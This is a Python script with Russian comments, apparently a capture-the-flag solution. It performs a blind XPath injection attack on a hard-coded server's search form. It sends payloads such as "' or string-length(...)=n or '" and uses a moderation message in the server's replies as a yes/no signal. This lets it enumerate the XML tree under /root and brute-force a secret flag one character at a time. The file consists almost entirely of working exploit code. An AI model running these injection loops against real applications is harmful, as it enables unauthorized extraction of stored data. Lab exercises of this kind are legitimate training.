
import requests

url = "http://185.255.132.89:8001/"
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# Проверка на ответ сервера ИСТИНА
def is_true(payload):
    payload = {"search": payload}
    req = requests.post(url, data=payload)
    if "модерации" in req.text:
        return True
    else:
        return False




# Узнаем все подкаталоги в /root/
def get_child_count():
    count = 1
    while True:
        payload = f"' or count(/root/*)={count} or '"
        if is_true(payload):
            print(f"number of /root nodes: {count}")
            return count
        count += 1

def get_len_node(node_num):
    length = 1
    while True:
        payload = f"' or string-length(name(/root/*[{node_num}]))={length} or '"
        if is_true(payload):
            print(f"lenght of num_node {node_num}: {length}")
            return length
        length += 1

def get_node_name(name_len, node_num):
    name = ""
    for i in range(1, name_len + 1):
        # print(i)
        for c in alphabet:
            payload = f"' or substring(name(/root/*[{node_num}]), {i}, 1) = '{c}' or '"
            if is_true(payload):
                print(f"the {i} char is: {c}")
                name += c
                break
    print(f"name of node: {name}")

num_nodes = get_child_count()
for n in range(1, num_nodes + 1):
    name_len = get_len_node(n)
    get_node_name(name_len, n)






# Узнаем подкаталоги в /root/secrettecret/
def get_len_secrettecret_node():
    length = 1
    while True:
        payload = f"' or string-length(name(/root/secrettecret/*[1]))={length} or '"
        if is_true(payload):
            print(f"lenght of /root/secrettecret/: {length}")
            return length
        length += 1

def get_secrettecret_node(name_len):
    name = ""
    for i in range(1, name_len + 1):
        print(i)
        for c in alphabet:
            payload = f"' or substring(name(/root/secrettecret/*[1]), {i}, 1) = '{c}' or '"
            if is_true(payload):
                print(f"the {i} char is: {c}")
                name += c
                break
    print(f"name of node: {name}")

def get_secrettecret():
    len = get_len_secrettecret_node()
    get_secrettecret_node(len)
get_secrettecret()





# Узнаем длину флага
def get_flag_data_length():
    length = 1
    while True:
        payload = f"' or string-length(/root/secrettecret/flag)={length} or '"
        if is_true(payload):
            return length
        length += 1
print(f"flag len: {get_flag_data_length()}")






# Подбираем флаг
def get_flag_data():
    length = 66  # Length of the data
    data = ''
    for position in range(1, length + 1):
        print(f"position extract: {position}")
        for char in ' _abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}-+=*#!&?/':
            payload = f"' or boolean(/root/secrettecret/flag[substring(., {position}, 1) = '{char}']) or '"
            # payload = f"' or starts-with(/root/secrettecret/flag/*, '{char}') or '"
            if is_true(payload):
                data += char
                print(data)
                # print(f"Found character at position {position}: {char}")  # Print progress
                break
    return data
flag_data = get_flag_data()
print(f"Data in /root/secrettecret/flag: {flag_data}")